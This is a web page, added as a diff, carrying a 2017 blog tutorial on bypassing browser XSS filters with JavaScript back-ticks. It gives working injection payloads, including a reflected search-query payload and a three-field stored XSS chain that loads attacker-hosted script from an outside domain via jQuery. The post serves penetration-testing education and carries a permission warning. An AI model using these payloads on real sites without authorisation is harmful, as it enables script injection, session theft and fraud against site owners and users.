@@ -1,0 +1,241 @@
+<!doctype html>
+<html>
+<head>
+<meta charset="utf-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge"/>
+<title>The Grave Accent and XSS</title>
+<meta name="description" content/>
+<meta name="HandheldFriendly" content="True"/>
+<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+<link rel="shortcut icon" href="/assets/img/favicon.png?v=2602511bcd"/>
+<link rel="stylesheet" type="text/css" href="/assets/css/screen.css?v=2602511bcd"/>
+<link rel="stylesheet" type="text/css" href="//fonts.googleapis.com/css?family=Noto+Serif:400,700,400italic|Open+Sans:700,400"/>
+<link rel="stylesheet" type="text/css" href="//cdn.muut.com/latest/moot.css"/>
+<link rel="canonical" href="https://davidmurdoch.com/2017/09/02/the-grave-accent-and-xss/"/>
+<meta property="og:site_name" content="David Murdoch"/>
+<meta property="og:type" content="article"/>
+<meta property="og:title" content="The Grave Accent and XSS"/>
+<meta property="og:description" content="In JavaScript, the grave accent, &#x60;, aka the back-tick character, allows the use of Template Literals, a new feature first introduced in Firefox 34 in late 2014. Today, about 77% of browsers have native support for the feature. Template Literals allow..."/>
+<meta property="og:url" content="https://davidmurdoch.com/2017/09/02/the-grave-accent-and-xss/"/>
+<meta property="article:published_time" content="2017-09-02T12:15:19.480Z"/>
+<meta property="article:modified_time" content="2017-09-02T16:18:24.071Z"/>
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="The Grave Accent and XSS"/>
+<meta name="twitter:description" content="In JavaScript, the grave accent, &#x60;, aka the back-tick character, allows the use of Template Literals, a new feature first introduced in Firefox 34 in late 2014. Today, about 77% of browsers have native support for the feature. Template Literals allow..."/>
+<meta name="twitter:url" content="https://davidmurdoch.com/2017/09/02/the-grave-accent-and-xss/"/>
+<script type="application/ld+json">
+{
+    "@context": "http://schema.org",
+    "@type": "Article",
+    "publisher": "David Murdoch",
+    "author": {
+        "@type": "Person",
+        "name": "David Murdoch",
+        "image": "//www.gravatar.com/avatar/bcf9850250d6a24e379401d22d530a09?d=404",
+        "url": "https://davidmurdoch.com/author/david-murdoch",
+        "sameAs": null,
+        "description": null
+    },
+    "headline": "The Grave Accent and XSS",
+    "url": "https://davidmurdoch.com/2017/09/02/the-grave-accent-and-xss/",
+    "datePublished": "2017-09-02T12:15:19.480Z",
+    "dateModified": "2017-09-02T16:18:24.071Z",
+    "description": "In JavaScript, the grave accent, &#x60;, aka the back-tick character, allows the use of Template Literals, a new feature first introduced in Firefox 34 in late 2014. Today, about 77% of browsers have native support for the feature. Template Literals allow..."
+}
+    </script>
+<meta name="generator" content="Ghost 0.6"/>
+<link rel="alternate" type="application/rss+xml" title="David Murdoch" href="https://davidmurdoch.com/rss/"/>
+<style>
+    .customcode {
+        border:1px solid #E3EDF3;
+        font-family: Inconsolata,monospace,sans-serif;
+        font-size: .85em;
+        white-space: pre-wrap;
+        background: #F7FAFB;
+        border-radius: 2px;
+        padding: 1px 3px;
+    }
+    abbr {
+		text-decoration: none;
+    }
+    .post-template .post-header {
+        padding:0;
+        border-bottom:solid 1px #ccc;
+        margin-bottom:1em;
+    }
+    .post-template .post-header a .blog-title {
+        font-size:1em;
+        padding:.1em;
+        color:#555;
+    }
+    .post-template .post-header a:hover .blog-title {
+        color:#57A3E8;
+    }
+</style>
+</head>
+<body class="post-template">
+<main class="content" role="main">
+<article class="post">
+<header class="post-header">
+<a class="blog-logo" href="https://davidmurdoch.com">
+<span class="blog-title">David Murdoch</span>
+</a>
+</header>
+<span class="post-meta"><time datetime="2017-09-02">02 Sep 2017</time> </span>
+<h1 class="post-title">The Grave Accent and XSS</h1>
+<section class="post-content">
+<p>In JavaScript, the grave accent, <code>`</code>, aka the back-tick character, allows the use of <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Template_literals">Template Literals</a>, a new feature first introduced in Firefox 34 in late 2014. Today, about <a href="https://caniuse.com/#feat=template-literals">77% of browsers</a> have native support for the feature. Template Literals allow the use of string interpolation and multi-line strings in JavaScript. In this post, I’ll show you how to use multi-line strings to bypass Reflective <abbr title="Cross-site scripting">XSS</abbr> Protection and other XSS attacks in today’s browsers.</p>
+<h3 id="findingavulnerablepage">Finding a vulnerable page</h3>
+<blockquote>
+<p><strong>Pen testing without permission might be illegal.</strong> There is precedent for unwarranted pen testing, XSS testing included, getting people in lots of legal trouble. I do pen testing as part of my day job, (usually) with explicit permission from the owner. :-)</p>
+</blockquote>
+<p>Okay, so now that that is out of the way, I’ll give you my easy method for finding a vulnerable page, and then send you on your way to the more complicated stuff.</p>
+<h4 id="theeasyway">The easy way:</h4>
+<ol>
+<li>Find an input field, like a search box.</li>
+<li>Type: <code>&lt;xss</code>.</li>
+<li>Press <kbd>↵ Enter</kbd>.</li>
+</ol>
+<p>If <code>&lt;xss</code> is returned in the source code of the page, you’ve got a page that is likely vulnerable to XSS attacks. If you find <code>&lt;xss</code> more than once on the page, you’ll probably be able to bypass the browser’s Reflective XSS Protection filters using the multi-line trick!</p>
+<h4 id="theotherways">The other ways:</h4>
+<p>I’ve got two sites I go to when I get stuck:</p>
+<ol>
+<li><a href="https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet">OWASP's XSS Filter Evasion Cheat Sheet</a> </li>
+<li><a href="https://html5sec.org/">html5sec.org</a></li>
+</ol>
+<p>These two sites aren’t exhaustive, and you’ll often need to know details about the whole HTTP pipeline to pull some attacks off fully, but they offer a great way to get started in front-end pen testing.</p>
+<h3 id="attackbasics">Attack basics</h3>
+<p>What is especially tricky about the Template Literal attack is that you’ll need to find two XSS vulnerabilities on a single page for it to work. In the first vulnerability, you’ll need to open a script tag (if not already within a JavaScript execution context) and in the second, you’ll need to close it.</p>
+<p>Let’s use a very simple, and real, example I found in the wild. We’ve got a page that we’ve found is vulnerable to <em>The Easy Way</em> attack through search URL like this: <code>http://web.site/search?q="&lt;xss</code> that outputs the following HTML:</p>
+<pre><font color="#999">&lt;</font><font color="#905">ul</font><font color="#999">&gt;</font>  
+    <font color="#999">&lt;</font><font color="#905">li</font><font color="#999">&gt;</font><font color="#999">&lt;</font><font color="#905">a</font> <font color="#690">href</font><font color="#999">="</font><font color="#07a">/search?q=</font><font color="#999">"</font><font color="#690">&lt;xss&amp;amp;p</font><font color="#999">=</font><font color="#07a">1</font><font color="#999">"</font><font color="#999">&gt;</font>1<font color="#999">&lt;/</font><font color="#905">a</font><font color="#999">&gt;</font><font color="#999">&lt;/</font><font color="#905">li</font><font color="#999">&gt;</font>
+    <font color="#999">&lt;</font><font color="#905">li</font><font color="#999">&gt;</font><font color="#999">&lt;</font><font color="#905">a</font> <font color="#690">href</font><font color="#999">="</font><font color="#07a">/search?q=</font><font color="#999">"</font><font color="#690">&lt;xss&amp;amp;p</font><font color="#999">=</font><font color="#07a">2</font><font color="#999">"</font><font color="#999">&gt;</font>2<font color="#999">&lt;/</font><font color="#905">a</font><font color="#999">&gt;</font><font color="#999">&lt;/</font><font color="#905">li</font><font color="#999">&gt;</font>
+<font color="#999">&lt;/</font><font color="#905">ul</font><font color="#999">&gt;</font>  
+</pre>
+<p>Unfortunately, we can’t use a basic XSS attack like <code>/search?q="&lt;script&gt;alert('xss')&lt;/script&gt;</code>, which <em>does</em> perfectly inject our attack into the HTML, because the browser itself won’t allow the page to load; the Reflective XSS Protection kicks in and stops our script from running! Instead, we’ll need to combine the two XSS vulnerabilities into one, (ab)using a grave accent character, like this: <code>/search?q="`;alert('XSS')&lt;/script&gt;&lt;script&gt;`​</code>. Which outputs:</p>
+<pre><font color="#aaa">&lt;ul&gt;  
+    &lt;li&gt;&lt;a href="/search?q=/search?q="</font><font color="#999" style="font-weight:600">`</font><b style="color:#999">​;alert('XSS')&lt;/script&gt;</font></b><span style="background:#FFFF00"><b><font color="#999">&lt;</font><font color="#905">script</font><font color="#999">&gt;</font></b><font color="#849e50" style="font-weight:600">`</font><font color="#849e50">&amp;​amp;p=1"&gt;1&lt;/a&gt;&lt;/li&gt;
+    &lt;li&gt;&lt;a href="/search?q=/search?q="</font><font color="#690" style="font-weight:600">`</font><b><font color="#999">;</font><font color="#DD4A68">alert</font><font color="#999">(</font><font color="#690">'XSS'</font><font color="#999">)</font><font color="#999">&lt;/</font><font color="#905">script</font><font color="#999">&gt;</font></b></span><b><font color="#999">&lt;script&gt;</font></b><font color="#aaa" style="font-weight:600">`</font><font color="#aaa">&amp;amp;p=2">2&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;</font>
+</pre>
+<p>Our complete injection is in bold and I’ve highlighted the part of the attack that becomes valid HTML, complete with our script tag. This attack slips right by the browser’s Reflective XSS Protection filter!</p>
+<p>This attack was easy to pull off, because we essentially had an unlimited number of characters available to craft the attack. An even more useful case for the grave accent attack is when we are limited in the number of characters we can use.</p>
+<h3 id="limitedcharactersandmultixssattackinteraction">Limited characters and multi XSS attack interaction</h3>
+<p>Let’s imagine you’ve found a website that is vulnerable to XSS data injection attacks (where you can persist your attack code without it being in the URL), but there are no fields that allow you to submit enough data to perform a useful attack. For example, whenever you try to save your Username as <code>&lt;script src=//your.domain&gt;</code> you only get <code>&lt;script src=//yo</code> back instead, truncated to 16 characters. How can you exploit this, assuming other fields are similarly vulnerable and jQuery is already available?</p>
+<p>Let’s assume your user’s public profile page’s HTML structure looks like this:</p>
+<pre><font color="#999">&lt;</font><font color="#905">ul</font><font color="#999">&gt;</font>  
+    <font color="#999">&lt;</font><font color="#905">li</font><font color="#999">&gt;</font>Username: <font color="#999">&lt;</font><font color="#905">span</font><font color="#999">&gt;</font>davidmurdoch<font color="#999">&lt;/</font><font color="#905">span</font><font color="#999">&gt;</font><font color="#999">&lt;/</font><font color="#905">li</font><font color="#999">&gt;</font>
+    <font color="#999">&lt;</font><font color="#905">li</font><font color="#999">&gt;</font>Twitter: <font color="#999">&lt;</font><font color="#905">a</font> <font color="#690">href</font><font color="#999">=&quot;</font><font color="#07a">https</font><font color="#07a">://twitter.com/atdavidmurdo​ch</font><font color="#999">&quot;</font><font color="#999">&gt;</font>Twitter<font color="#999">&lt;/</font><font color="#905"><font color="#905">a</font></font><font color="#999">&gt;</font><font color="#999">&lt;/</font><font color="#905">li</font><font color="#999">&gt;</font>
+    <font color="#999">&lt;</font><font color="#905">li</font><font color="#999">&gt;</font>YouTube Video: <font color="#999">&lt;</font><font color="#905">a</font> <font color="#690">href</font><font color="#999">=&quot;</font><font color="#07a">https</font><font color="#07a">://www.youtube.com/watch?v=dQw4w9WgXcQ​</font><font color="#999">&quot;</font><font color="#999">&gt;</font>YouTube<font color="#999">&lt;/</font><font color="#905">a</font><font color="#999">&gt;</font><font color="#999">&lt;/</font><font color="#905">li</font><font color="#999">&gt;</font>
+<font color="#999">&lt;/</font><font color="#905">ul</font><font color="#999">&gt;</font>  
+</pre>
+<p>This seems pretty reasonable to me.</p>
+<p>What could you put in the Username, Twitter, and YouTube Video fields to make the attack work? The Twitter field allows up to 15 characters and the YouTube Video field allows 11 (and you already know the Username field is limited to 16).</p>
+<p>In case you’re thinking this is is just some contrived example that doesn’t happen in the real world; this is the exact situation we found while contracted to pen test a client’s online marketplace. In the end, we credited the owner’s account with 4 quintillion of their online “currency” by utilizing various attacks, including this one. But I digress…</p>
+<p>Even if you could get an <code>" onload=</code> trick to work, you can’t do anything useful with the 7 characters you’ve got left over&#8202;—&#8202;and what’s the point of an attack that can’t actually do anything? Could you spread our attack over the 3 limited fields using <code>`</code>?</p>
+<p><b><center>Yes. Absolutely!</center></b></p>
+<pre>
+
+
+
+
+<b><center>Give it a try before diving in to the code below.</center></b>
+
+
+
+</pre>
+<h4 id="theanswer">The answer:</h4>
+<pre><font color="#999">&lt;</font><font color="#905">ul</font><font color="#999">&gt;</font>  
+    <font color="#999">&lt;</font><font color="#905">li</font><font color="#999">&gt;</font>Username: <font color="#999">&lt;</font><font color="#905">span</font><font color="#999">&gt;</font><font color="#999">&lt;</font><font color="#905">script</font><font color="#999">&gt;</font><font color="#DD4A68">$</font><font color="#999">(</font><font color="#690">`a/*&lt;/span&gt;&lt;/li&gt;
+    &lt;li&gt;Twitter: &lt;a href="https</font><font color="#690">://twitter.com/`</font><font color="#999">).</font><font color="#DD4A68">load</font><font color="#690">`//л.cc/"&gt;Twitter&lt;/a&gt;&lt;/li&gt;
+    &lt;li&gt;YouTube: &lt;a href="https</font><font color="#690">://www.youtube.com/watch?v=`</font><font color="#999">&lt;/</font><font color="#905">script</font><font color="#999">&gt;</font>"&gt;YouTube<font color="#999">&lt;/</font><font color="#905">a</font><font color="#999">&gt;</font><font color="#999">&lt;/</font><font color="#905">li</font><font color="#999">&gt;</font>
+<font color="#999">&lt;/</font><font color="#905">ul</font><font color="#999">&gt;</font>  
+</pre>
+<h5 id="hereshowitworks">Here’s how it works:</h5>
+<p>Each field is used in a way that combines and interacts with the other fields. I’ll explain each field one at a time.</p>
+<h6 id="username">Username</h6>
+<p>In our username field we enter the string "<span class="customcode"><font color="#999">&lt;</font><font color="#905">script</font><font color="#999">&gt;</font><font color="#DD4A68">$</font><font color="#999">(</font><font color="#690">&#96;a/*</font></span>". This opens our script tag then uses jQuery (<font color="#DD4A68"><code>$</code></font>) to select the <code>&lt;a&gt;</code> elements on the page by using a clever selector trick. You probably know that <code>"a"</code> is a valid selector on its own, and that <code>"a&lt;/span&gt;&lt;/li&gt;\n&lt;li&gt;Twitter…"</code> would throw an error. So what can we do? We don’t have enough space to craft the attack to exclude the extraneous HTML so we have to figure out how to: 1) include it in the selector, 2) make sure it does’t throw, and 3) make sure it still selects something.</p>
+<p>I finally found something that worked: <font color="#690"><code>/*</code></font>, a CSS comment. It seems that the Sizzle CSS selector engine, used by jQuery, exits the selector parsing early for selectors that contain comments (I haven’t verified this is exactly what happens). This means we end up just selecting all <code>a</code> elements on the page. Perfect!</p>
+<p>If it isn’t clear already, that <font color="#690"><code>`</code></font> character we use allows us to grab the HTML of the line below, including it in our selector string, so the new line doesn’t break our script tag, as it would have had we created the selector string with a typical <code>"</code> character. This lets us combine our Username XSS with the following Twitter XSS.</p>
+<h6 id="twitter">Twitter</h6>
+<p>We enter <span class="customcode"><font color="#690">&#96;</font><font color="#999">).</font><font color="#DD4A68">load</font><font color="#690">&#96;//л.cc/</font></span> into the Twitter field. The first thing this does is close the CSS selector string (<font color="#690"><code>`</code></font>) and function call <font color="#999"><code>)</code></font> we started up in the Username field. We then call jQuery’s <font color="#DD4A68"><code>load</code></font> method which will load into the element (those anchor tags we selected) any HTML returned by the URL we pass in (if <abbr title="Cross-Origin Resource Sharing">CORS</abbr> is properly configured on the server, of course).</p>
+<p>The <span class="customcode"><font color="#690">&#96;//л.cc/</font></span> part is actually a valid URL, and is a bit of a cheat. I couldn’t figure out how to remove another character from the attack in order to use a 5 character domain (e.g., <code>lv.ht</code> or something), so I used a <a href="https://en.wikipedia.org/wiki/Punycode">punycode</a> domain instead. The one above isn’t currently registered, so feel free to buy it for yourself.</p>
+<p>The way this domain trick works is that we set up the server the domain points to always return the proper CORS headers and an HTML document with our attack script embedded within it for all requests to any URL.</p>
+<p>Did you notice we skip the parenthesis on the call to <font color="#DD4A68"><code>load</code></font>? This is another feature of Template Literals (called Tag Functions) that enable us to shave two characters off our total character count. Note, however, that this trick isn’t a perfect replacement for passing strings the “usual” way, and doesn’t work when passing in the selector string to <font color="#DD4A68"><code>$</code></font> like this: <span class="customcode"><font color="#DD4A68">$</font><font color="#690">&#96;a&#96;</font></span>. This is because when using jQuery’s <code>$</code> function as a Tag Function it treats the Template Literal string we pass in an array instead of a CSS selector string (this isn’t a bug in jQuery, it actually <em>is</em> an Array here&#8202;—&#8202;this is just how Tag Functions work).</p>
+<p>We then use the same Template Literal trick we used in the Username field, the <font color="#690"><code>`</code></font> character, to craft our URL to our server while simultaneously “consuming” the closing Twitter HTML and opening YouTube Video HTML in a JavaScript Template Literal so this HTML doesn’t invalidated our script tag. Appending this HTML to our URL works because our server is configured to always return our attack payload for any path.</p>
+<h6 id="youtubevideo">YouTube Video</h6>
+<p>We finish our attack by entering <span class="customcode"><font color="#690">&#96;</font><font color="#999">&lt;/</font><font color="#905">script</font><font color="#999">&gt;</font></span> in our YouTube Video field. We end the Twitter field’s call to <font color="#DD4A68"><code>load</code></font> with a final <span class="customcode"><font color="#690">&#96;</font></span> character then close our script tag. And we’ve still got a single character to spare!</p>
+<p>This completes our multi-vector XSS attack and allows us to load in any JavaScript payload we want!</p>
+<p><strong>YouTube Video alternative</strong></p>
+<p>Unrelated to the grave-accent trick, another handy tool we could have used here, if the page allowed for it, is to end the attack script without closing our script tag, and instead, open a multi-line comment (<code>/*</code>) and rely on one of the page’s own <code>script</code> tags’ multi-line comments to close it for us later in the page. Like this:</p>
+<pre><font color="#690">    ... same as above ...  
+    &lt;li&gt;YouTube: &lt;a href="https</font><font color="#690">://www.youtube.com/watch?v=`</font><font color="slategray">/*"&gt;YouTube&lt;/a&gt;&lt;/li&gt;
+&lt;ul&gt;
+&lt;script&gt;
+    /*
+        BEGIN SITE CODE
+    */
+    </font><font color="#DD4A68">init</font><font color="#999">();</font>
+<font color="#999">&lt;/</font><font color="#905">script</font><font color="#999">&gt;</font>  
+</pre>
+<p>Notice that the end of the YouTube Video’s opening <code>&lt;a&gt;</code> tag through the closing <code>&lt;/ul&gt;</code> tag are all now within our comment block. It even continues on through to the following <code>&lt;script&gt;</code> tag and its comment block until we reach the close of that comment.</p>
+<p>An added bonus to this attack is that we don’t use any characters that get altered by functions designed to escape special HTML characters (typically <code>&amp;"'&lt;&gt;</code>); it’s surprisingly common for some data to be properly sanitized, while other user data on the same page is not. Unfortunately, this attack doesn’t always work since we can’t guarantee the page will have a script tag with a multi-line comment in it placed following our XSS attack.</p>
+<h3 id="conclusion">Conclusion</h3>
+<p>The back-tick/grave accent, used to create JavaScript Template Literals, can be a great tool in your pen testing arsenal. It allows for XSS attacks that “consume” extraneous HTML, while effectively bypassing Reflective XSS filters. In a similar fashion, JavaScript’s multi-line comments can also be used, though when pressed for bytes, the grave accent can be extra handy.</p>
+<p>Let me know if you can find a better way to exploit the examples above!</p>
+<p>Happy pen testing!</p>
+</section>
+<section class="post-comment">
+<a class="moot" title="Comments on The Grave Accent and XSS" href="https://muut.com/i/davidmurdoch/comments:23">Comments for this blog entry</a>
+</section>
+<footer class="post-footer">
+<section class="author">
+<h4>David Murdoch</h4>
+<p></p>
+<ul class="author-meta clearfix">
+</ul>
+</section>
+<section class="share">
+<h4>Share this post</h4>
+<a class="icon-twitter" href="https://twitter.com/share?text=The%20Grave%20Accent%20and%20XSS&amp;url=https://davidmurdoch.com/2017/09/02/the-grave-accent-and-xss/" onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
+<span class="hidden">Twitter</span>
+</a>
+<a class="icon-facebook" href="https://www.facebook.com/sharer/sharer.php?u=https://davidmurdoch.com/2017/09/02/the-grave-accent-and-xss/" onclick="window.open(this.href, 'facebook-share','width=580,height=296');return false;">
+<span class="hidden">Facebook</span>
+</a>
+<a class="icon-google-plus" href="https://plus.google.com/share?url=https://davidmurdoch.com/2017/09/02/the-grave-accent-and-xss/" onclick="window.open(this.href, 'google-plus-share', 'width=490,height=530');return false;">
+<span class="hidden">Google+</span>
+ </a>
+</section>
+</footer>
+</article>
+</main>
+<footer class="site-footer">
+<a class="subscribe icon-feed" href="https://davidmurdoch.com/rss/"><span class="tooltip">Subscribe!</span></a>
+<div class="inner">
+<section class="copyright">&copy; 2017 <a href="https://davidmurdoch.com/">David Murdoch</a></section>
+<section>
+<svg viewBox="0 0 300 300"><path fill="#2CAAE1" d="M250,87.974c-7.358,3.264-15.267,5.469-23.566,6.461c8.471-5.078,14.978-13.119,18.041-22.701c-7.929,4.703-16.71,8.117-26.057,9.957c-7.484-7.975-18.148-12.957-29.95-12.957c-22.66,0-41.033,18.371-41.033,41.031c0,3.216,0.363,6.348,1.063,9.351c-34.102-1.711-64.336-18.047-84.574-42.872c-3.532,6.06-5.556,13.108-5.556,20.628c0,14.236,7.244,26.795,18.254,34.153c-6.726-0.213-13.053-2.059-18.585-5.132c-0.004,0.171-0.004,0.343-0.004,0.516c0,19.88,14.144,36.464,32.915,40.234c-3.443,0.938-7.068,1.439-10.81,1.439c-2.644,0-5.214-0.258-7.72-0.736c5.222,16.301,20.375,28.165,38.331,28.495c-14.043,11.006-31.735,17.565-50.96,17.565c-3.312,0-6.578-0.194-9.788-0.574c18.159,11.643,39.727,18.437,62.899,18.437c75.473,0,116.746-62.524,116.746-116.747c0-1.779-0.04-3.548-0.119-5.309C237.543,103.429,244.499,96.202,250,87.974z"></path></svg>
+<a href="https://twitter.com/atdavidmurdoch" rel="nofollow" style="color:#2caae1">@atdavidmurdoch</a>
+</section>
+</div>
+</footer>
+<script src="/public/jquery.min.js?v=2602511bcd"></script>
+<script type="text/javascript" src="/assets/js/jquery.fitvids.js?v=2602511bcd"></script>
+<script type="text/javascript" src="/assets/js/index.js?v=2602511bcd"></script>
+<script src="//cdn.muut.com/latest/moot.min.js"></script>
+<script>
+	  // if google analytics is already on the page, don't load it again!
+	  // this is because we run some google analytics tests and I don't want mess with them.
+	  if(!window.ga){
+		  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+		  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+		  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+		  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+		  ga('create', 'UA-30736283-1', 'auto');
+		  ga('send', 'pageview');
+	  }
+	</script>
+</body>
+</html>
